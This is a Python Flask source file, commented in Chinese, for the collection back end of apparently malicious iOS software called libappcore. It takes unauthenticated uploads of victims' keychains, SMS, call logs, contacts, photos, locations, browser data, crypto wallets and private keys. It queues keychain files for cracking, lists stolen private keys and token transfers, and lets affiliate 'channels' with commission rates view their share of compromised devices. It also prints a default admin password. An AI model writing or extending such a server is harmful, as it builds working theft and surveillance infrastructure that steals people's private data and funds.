#!/usr/bin/env python3
"""
appcore_server.py - libappcore 多租户远程接收服务器
核心服务端 + 代理后台 API

架构:
  设备端 libappcore.dylib → 上传数据 → 核心服务端（全量数据+破解+权限）
  代理/管理员 → Web 后台 → 按渠道查看数据

API 分组:
  /upload/<type>          - 设备上传（兼容 SimpleUploader 协议，无需认证）
  /api/auth/*             - 认证
  /api/devices            - 设备列表（按渠道过滤）
  /api/devices/<id>/files - 设备文件
  /api/stats              - 统计
  /api/crack-queue        - 破解队列
  /api/private-keys       - 私钥信息
  /api/token-transfers    - 代币转账
  /api/admin/*            - 管理员专属（用户/渠道管理）
  /                       - 代理后台前端
"""

import os
import sys
import json
import uuid
import time
import hashlib
import logging
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory, abort, g

# 确保能 import 同目录模块
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import database
import auth as auth_module

# ============================================================================
# 配置
# ============================================================================
UPLOAD_DIR = os.environ.get("UPLOAD_DIR", os.path.join(os.path.dirname(__file__), "uploads"))
MAX_CONTENT_LENGTH = int(os.environ.get("MAX_CONTENT_LENGTH", 500 * 1024 * 1024))
LOG_FILE = os.environ.get("LOG_FILE", os.path.join(os.path.dirname(__file__), "appcore_server.log"))
WEB_DIR = os.path.join(os.path.dirname(__file__), "admin-web")

os.makedirs(UPLOAD_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler()]
)
logger = logging.getLogger("appcore_server")

app = Flask(__name__, static_folder=None)
app.config["MAX_CONTENT_LENGTH"] = MAX_CONTENT_LENGTH

# 初始化数据库
database.init_db()


# ============================================================================
# 工具函数
# ============================================================================

def get_extension_by_type(upload_type: str) -> str:
    extensions = {
        "filesystem": ".tar.gz", "keychain": ".xml", "metadata": ".json",
        "thumbnail": ".jpg", "file": ".bin", "plist": ".plist",
        "database": ".db", "memo": ".xml", "private_key": ".json",
        "sms": ".xml", "call_log": ".xml", "contacts": ".vcf",
        "photo": ".jpg", "video": ".mp4", "location": ".json",
        "browser": ".tar.gz", "wallet": ".json",
    }
    return extensions.get(upload_type, ".bin")


def get_device_dir(acquisition_id: str, bundle_id: str) -> str:
    safe_id = acquisition_id or "unknown"
    safe_bundle = bundle_id or "unknown"
    device_dir = os.path.join(UPLOAD_DIR, safe_id, safe_bundle)
    os.makedirs(device_dir, exist_ok=True)
    return device_dir


def extract_device_uid(headers, acquisition_id):
    """从请求头或 acquisition-id 提取设备唯一标识"""
    # 优先使用 X-Device-UID
    uid = headers.get("X-Device-UID", "")
    if uid:
        return uid
    # 其次使用 acquisition-id
    if acquisition_id and acquisition_id != "unknown":
        return acquisition_id
    # 最后用 IP + User-Agent 哈希
    ua = headers.get("User-Agent", "")
    ip = request.remote_addr or "unknown"
    return hashlib.md5(f"{ip}_{ua}".encode()).hexdigest()[:16].upper()


def determine_channel(device_uid, headers):
    """
    根据设备信息确定归属渠道
    优先级: X-Channel-ID 头 > 设备已绑定渠道 > 默认渠道
    """
    # 1. 上传时指定渠道
    channel_id = headers.get("X-Channel-ID", "")
    if channel_id:
        try:
            return int(channel_id)
        except ValueError:
            pass

    # 2. 设备已绑定
    device = database.get_device(
        database.upsert_device(device_uid, "", request.remote_addr or "")
    )
    if device and device.get("channel_id"):
        return device["channel_id"]

    # 3. 默认渠道（第一个）
    channels = database.list_channels()
    if channels:
        return channels[0]["id"]
    return None


# ============================================================================
# 设备上传接口（兼容 SimpleUploader，无需认证）
# ============================================================================

@app.route("/upload/<upload_type>", methods=["POST"])
def upload_file(upload_type):
    """
    接收设备端文件上传
    HTTP 头: X-OS-Version, X-Bundle-ID, acquisition-id, X-Device-UID, X-Channel-ID
    """
    os_version = request.headers.get("X-OS-Version", "unknown")
    bundle_id = request.headers.get("X-Bundle-ID", "unknown")
    acquisition_id = request.headers.get("acquisition-id", str(uuid.uuid4()))
    device_uid = extract_device_uid(request.headers, acquisition_id)
    ip = request.remote_addr or ""

    data = request.get_data()
    if not data:
        return jsonify({"error": "empty data"}), 400

    sha256 = hashlib.sha256(data).hexdigest()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    ext = get_extension_by_type(upload_type)
    filename = f"{upload_type}_{timestamp}_{sha256[:8]}{ext}"

    # 保存文件
    device_dir = get_device_dir(acquisition_id, bundle_id)
    filepath = os.path.join(device_dir, filename)
    with open(filepath, 'wb') as f:
        f.write(data)

    # 确定渠道并 upsert 设备
    channel_id = determine_channel(device_uid, request.headers)
    device_id = database.upsert_device(
        device_uid, os_version, ip, channel_id, bundle_id, acquisition_id
    )

    # 记录文件
    file_id = database.add_file(
        device_id, upload_type, filename, filepath, len(data), sha256
    )

    logger.info(f"上传: type={upload_type}, device={device_uid}, "
                f"os={os_version}, size={len(data)}, channel={channel_id}")

    return jsonify({
        "status": "ok",
        "device_uid": device_uid,
        "file_id": file_id,
        "filename": filename,
        "size": len(data),
        "sha256": sha256,
    }), 200


# ============================================================================
# 认证 API
# ============================================================================

@app.route("/api/auth/login", methods=["POST"])
def api_login():
    """用户登录"""
    data = request.get_json(silent=True) or {}
    username = data.get("username", "").strip()
    password = data.get("password", "")

    if not username or not password:
        return jsonify({"error": "用户名和密码不能为空"}), 400

    token, user_info = auth_module.authenticate(username, password)
    if not token:
        return jsonify({"error": user_info}), 401

    return jsonify({"token": token, "user": user_info})


@app.route("/api/auth/logout", methods=["POST"])
@auth_module.login_required
def api_logout():
    """用户登出"""
    auth_header = request.headers.get("Authorization", "")
    token = auth_header[7:] if auth_header.startswith("Bearer ") else ""
    auth_module.logout(token)
    return jsonify({"status": "ok"})


@app.route("/api/auth/me", methods=["GET"])
@auth_module.login_required
def api_me():
    """获取当前用户信息"""
    user = g.current_user
    user_info = database.get_user_by_id(user["user_id"])
    if user_info:
        channel = database.get_channel(user_info["channel_id"]) if user_info.get("channel_id") else None
        return jsonify({
            "id": user_info["id"],
            "username": user_info["username"],
            "role": user_info["role"],
            "display_name": user_info.get("display_name", ""),
            "channel": channel,
        })
    return jsonify({"error": "用户不存在"}), 404


# ============================================================================
# 设备 API（按渠道过滤）
# ============================================================================

@app.route("/api/devices", methods=["GET"])
@auth_module.login_required
def api_devices():
    """
    设备列表（iOS文件统计页面）
    参数: keyword, os_version, start_date, end_date, channel_id(admin)
    """
    user = g.current_user
    channel_id = auth_module.get_accessible_channel_id(user)

    # admin 可以指定查看某个渠道
    if user["role"] == "admin":
        req_channel = request.args.get("channel_id", "")
        if req_channel:
            try:
                channel_id = int(req_channel)
            except ValueError:
                pass

    keyword = request.args.get("keyword", "")
    os_version = request.args.get("os_version", "")
    start_date = request.args.get("start_date", "")
    end_date = request.args.get("end_date", "")

    devices = database.list_devices(channel_id, keyword, os_version, start_date, end_date)

    # 为每台设备附加文件统计
    result = []
    for d in devices:
        stats = database.get_device_files_stats(d["id"])
        keychain = stats.get("keychain", {"total": 0, "pending": 0})
        memo = stats.get("memo", {"total": 0, "pending": 0})
        channel = database.get_channel(d["channel_id"]) if d.get("channel_id") else None

        result.append({
            "id": d["id"],
            "device_uid": d["device_uid"],
            "os_version": d["os_version"],
            "ip": d["ip"],
            "channel_name": channel["name"] if channel else "未分配",
            "platform_no": channel["platform_no"] if channel else "",
            "pipe_no": channel["pipe_no"] if channel else "",
            "keychain_count": keychain["total"],
            "keychain_pending": keychain["pending"],
            "memo_count": memo["total"],
            "memo_pending": memo["pending"],
            "first_seen": d["first_seen"],
            "last_seen": d["last_seen"],
            "status": d["status"],
        })

    return jsonify({"devices": result, "count": len(result)})


@app.route("/api/devices/<int:device_id>", methods=["GET"])
@auth_module.login_required
def api_device_detail(device_id):
    """设备详情"""
    user = g.current_user
    device = database.get_device(device_id)
    if not device:
        return jsonify({"error": "设备不存在"}), 404

    # 权限检查
    channel_id = auth_module.get_accessible_channel_id(user)
    if channel_id and device.get("channel_id") != channel_id:
        return jsonify({"error": "无权访问该设备"}), 403

    stats = database.get_device_files_stats(device_id)
    files = database.list_files(device_id=device_id)
    channel = database.get_channel(device["channel_id"]) if device.get("channel_id") else None

    return jsonify({
        "device": device,
        "channel": channel,
        "file_stats": stats,
        "files": files[:100],
    })


@app.route("/api/devices/<int:device_id>/files", methods=["GET"])
@auth_module.login_required
def api_device_files(device_id):
    """设备文件列表"""
    user = g.current_user
    device = database.get_device(device_id)
    if not device:
        return jsonify({"error": "设备不存在"}), 404

    channel_id = auth_module.get_accessible_channel_id(user)
    if channel_id and device.get("channel_id") != channel_id:
        return jsonify({"error": "无权访问"}), 403

    file_type = request.args.get("type", "")
    crack_status = request.args.get("crack_status", "")
    files = database.list_files(device_id=device_id, file_type=file_type or None,
                                crack_status=crack_status or None)
    return jsonify({"files": files, "count": len(files)})


# ============================================================================
# 统计 API
# ============================================================================

@app.route("/api/stats", methods=["GET"])
@auth_module.login_required
def api_stats():
    """总览统计"""
    user = g.current_user
    channel_id = auth_module.get_accessible_channel_id(user)

    if user["role"] == "admin":
        req_channel = request.args.get("channel_id", "")
        if req_channel:
            try:
                channel_id = int(req_channel)
            except ValueError:
                pass

    stats = database.get_overall_stats(channel_id)
    return jsonify(stats)


@app.route("/api/stats/ios-files", methods=["GET"])
@auth_module.login_required
def api_ios_file_stats():
    """iOS 文件统计（对应截图页面的汇总数据）"""
    user = g.current_user
    channel_id = auth_module.get_accessible_channel_id(user)

    if user["role"] == "admin":
        req_channel = request.args.get("channel_id", "")
        if req_channel:
            try:
                channel_id = int(req_channel)
            except ValueError:
                pass

    devices = database.list_devices(channel_id)
    total_keychain = 0
    total_keychain_pending = 0
    total_memo = 0
    total_memo_pending = 0

    for d in devices:
        stats = database.get_device_files_stats(d["id"])
        total_keychain += stats.get("keychain", {}).get("total", 0)
        total_keychain_pending += stats.get("keychain", {}).get("pending", 0)
        total_memo += stats.get("memo", {}).get("total", 0)
        total_memo_pending += stats.get("memo", {}).get("pending", 0)

    return jsonify({
        "device_count": len(devices),
        "keychain_total": total_keychain,
        "keychain_pending": total_keychain_pending,
        "memo_total": total_memo,
        "memo_pending": total_memo_pending,
    })


# ============================================================================
# 破解队列 API
# ============================================================================

@app.route("/api/crack-queue", methods=["GET"])
@auth_module.login_required
def api_crack_queue():
    """破解队列"""
    user = g.current_user
    channel_id = auth_module.get_accessible_channel_id(user)
    status = request.args.get("status", "")
    queue = database.list_crack_queue(status=status or None, channel_id=channel_id)
    return jsonify({"queue": queue, "count": len(queue)})


@app.route("/api/crack-queue/<int:file_id>/process", methods=["POST"])
@auth_module.admin_required
def api_process_crack(file_id):
    """标记破解完成（管理员）"""
    data = request.get_json(silent=True) or {}
    status = data.get("status", "done")
    result = data.get("result", "")
    database.update_file_crack(file_id, status, result)
    database.add_audit_log(g.current_user["user_id"], "crack_process",
                           f"file:{file_id}", f"状态={status}", request.remote_addr)
    return jsonify({"status": "ok"})


# ============================================================================
# 私钥信息 API
# ============================================================================

@app.route("/api/private-keys", methods=["GET"])
@auth_module.login_required
def api_private_keys():
    """私钥信息列表"""
    user = g.current_user
    channel_id = auth_module.get_accessible_channel_id(user)
    device_id = request.args.get("device_id", "")
    keys = database.list_private_keys(
        channel_id=channel_id,
        device_id=int(device_id) if device_id else None
    )
    return jsonify({"keys": keys, "count": len(keys)})


# ============================================================================
# 代币转账 API
# ============================================================================

@app.route("/api/token-transfers", methods=["GET"])
@auth_module.login_required
def api_token_transfers():
    """代币转账记录"""
    user = g.current_user
    channel_id = auth_module.get_accessible_channel_id(user)
    chain = request.args.get("chain", "")
    transfers = database.list_token_transfers(channel_id=channel_id, chain=chain or None)
    return jsonify({"transfers": transfers, "count": len(transfers)})


# ============================================================================
# 管理员 API
# ============================================================================

@app.route("/api/admin/users", methods=["GET"])
@auth_module.admin_required
def api_admin_users():
    """用户列表（管理员）"""
    role = request.args.get("role", "")
    users = database.list_users(role=role or None)
    # 附加渠道信息
    for u in users:
        if u.get("channel_id"):
            ch = database.get_channel(u["channel_id"])
            u["channel_name"] = ch["name"] if ch else ""
        u.pop("password_hash", None)
    return jsonify({"users": users, "count": len(users)})


@app.route("/api/admin/users", methods=["POST"])
@auth_module.admin_required
def api_admin_create_user():
    """创建用户（管理员）"""
    data = request.get_json(silent=True) or {}
    username = data.get("username", "").strip()
    password = data.get("password", "")
    role = data.get("role", "agent")
    channel_id = data.get("channel_id")
    display_name = data.get("display_name", "")

    if not username or not password:
        return jsonify({"error": "用户名和密码不能为空"}), 400
    if role not in ("admin", "agent"):
        return jsonify({"error": "角色无效"}), 400

    user_id = database.create_user(username, password, role, channel_id, display_name)
    if not user_id:
        return jsonify({"error": "用户名已存在"}), 400

    database.add_audit_log(g.current_user["user_id"], "create_user",
                           f"user:{user_id}", f"创建用户 {username}", request.remote_addr)
    return jsonify({"status": "ok", "user_id": user_id})


@app.route("/api/admin/channels", methods=["GET"])
@auth_module.admin_required
def api_admin_channels():
    """渠道列表（管理员）"""
    channels = database.list_channels()
    # 附加设备数
    for ch in channels:
        devices = database.list_devices(ch["id"])
        ch["device_count"] = len(devices)
    return jsonify({"channels": channels, "count": len(channels)})


@app.route("/api/admin/channels", methods=["POST"])
@auth_module.admin_required
def api_admin_create_channel():
    """创建渠道（管理员）"""
    data = request.get_json(silent=True) or {}
    platform_no = data.get("platform_no", "").strip()
    pipe_no = data.get("pipe_no", "").strip()
    name = data.get("name", "").strip()
    contact = data.get("contact", "")
    phone = data.get("phone", "")
    commission_rate = float(data.get("commission_rate", 0.3))

    if not platform_no or not pipe_no or not name:
        return jsonify({"error": "平台号、管道号、名称不能为空"}), 400

    channel_id = database.create_channel(platform_no, pipe_no, name, contact, phone, commission_rate)
    if not channel_id:
        return jsonify({"error": "渠道已存在"}), 400

    database.add_audit_log(g.current_user["user_id"], "create_channel",
                           f"channel:{channel_id}", f"创建渠道 {name}", request.remote_addr)
    return jsonify({"status": "ok", "channel_id": channel_id})


@app.route("/api/admin/audit-logs", methods=["GET"])
@auth_module.admin_required
def api_admin_audit_logs():
    """操作日志（管理员）"""
    conn = database.get_db()
    rows = conn.execute("""
        SELECT al.*, u.username FROM audit_logs al
        LEFT JOIN users u ON al.user_id = u.id
        ORDER BY al.created_at DESC LIMIT 200
    """).fetchall()
    conn.close()
    return jsonify({"logs": [dict(r) for r in rows]})


# ============================================================================
# 文件下载
# ============================================================================

@app.route("/api/files/<int:file_id>/download", methods=["GET"])
@auth_module.login_required
def api_download_file(file_id):
    """下载文件"""
    user = g.current_user
    conn = database.get_db()
    row = conn.execute("""
        SELECT f.*, d.channel_id FROM files f
        JOIN devices d ON f.device_id = d.id WHERE f.id=?
    """, (file_id,)).fetchone()
    conn.close()

    if not row:
        return jsonify({"error": "文件不存在"}), 404

    channel_id = auth_module.get_accessible_channel_id(user)
    if channel_id and row["channel_id"] != channel_id:
        return jsonify({"error": "无权访问"}), 403

    filepath = row["filepath"]
    if not os.path.exists(filepath):
        return jsonify({"error": "文件已丢失"}), 404

    directory = os.path.dirname(filepath)
    filename = os.path.basename(filepath)
    return send_from_directory(directory, filename, as_attachment=True)


# ============================================================================
# 前端静态文件服务
# ============================================================================

@app.route("/")
def index():
    """代理后台首页"""
    if os.path.exists(os.path.join(WEB_DIR, "index.html")):
        return send_from_directory(WEB_DIR, "index.html")
    return jsonify({"name": "libappcore Multi-tenant Server", "status": "running"})


@app.route("/<path:path>")
def static_files(path):
    """静态文件"""
    if os.path.exists(os.path.join(WEB_DIR, path)):
        return send_from_directory(WEB_DIR, path)
    # SPA 回退到 index.html
    if os.path.exists(os.path.join(WEB_DIR, "index.html")):
        return send_from_directory(WEB_DIR, "index.html")
    abort(404)


# ============================================================================
# 错误处理
# ============================================================================

@app.errorhandler(413)
def too_large(e):
    return jsonify({"error": "文件过大", "max_size": MAX_CONTENT_LENGTH}), 413


@app.errorhandler(500)
def server_error(e):
    logger.error(f"服务器错误: {e}")
    return jsonify({"error": "服务器内部错误"}), 500


# ============================================================================
# 启动
# ============================================================================

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="libappcore 多租户远程接收服务器")
    parser.add_argument("-H", "--host", default="0.0.0.0", help="监听地址")
    parser.add_argument("-p", "--port", type=int, default=8080, help="监听端口")
    parser.add_argument("-d", "--debug", action="store_true", help="调试模式")
    parser.add_argument("-o", "--output-dir", default=UPLOAD_DIR, help="上传目录")

    args = parser.parse_args()
    UPLOAD_DIR = args.output_dir
    os.makedirs(UPLOAD_DIR, exist_ok=True)

    logger.info("=" * 60)
    logger.info("libappcore 多租户远程接收服务器启动")
    logger.info(f"监听: http://{args.host}:{args.port}")
    logger.info(f"上传目录: {UPLOAD_DIR}")
    logger.info(f"后台地址: http://{args.host}:{args.port}/")
    logger.info(f"默认管理员: admin / admin123")
    logger.info("=" * 60)

    app.run(host=args.host, port=args.port, debug=args.debug)
